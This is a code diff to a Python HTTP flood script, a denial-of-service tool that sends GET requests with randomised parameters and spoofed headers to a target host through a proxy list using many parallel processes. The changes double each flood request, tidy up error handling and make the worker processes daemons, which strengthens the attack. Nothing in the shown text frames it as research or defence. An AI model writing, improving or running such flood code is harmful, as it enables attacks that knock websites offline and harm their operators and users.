@@ -1,4 +1,3 @@
-from numba import jit
 import ssl
 import multiprocessing, threading
 import socket
@@ -99,8 +98,6 @@ def checkProxies():
         f.write(proxy)
     f.close()
 
-time.sleep(1)
-@jit
 def Flood(indexPicker):
     if indexPicker < len(proxies):
         proxy = proxies[indexPicker].strip().split(":")
@@ -129,10 +126,11 @@ def Flood(indexPicker):
                     valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
                     floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
                     s.send(str(floodHeader).encode())
+                    s.send(str(floodHeader).encode())
                 s.close()
                 print("Flood sent " + proxy[0] + ":" + proxy[1])
             except:
-                time.sleep(.1)
+                s.close()
         except:
             s.close()
 
@@ -158,5 +156,7 @@ for _ in range(100):
     userAgentList.append(userAgent)
 for indexPicker in range(threadNumber):
     thread = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-    thread.setDaemon = False
+    thread.daemon = True
     thread.start()
+while True:
+    input()
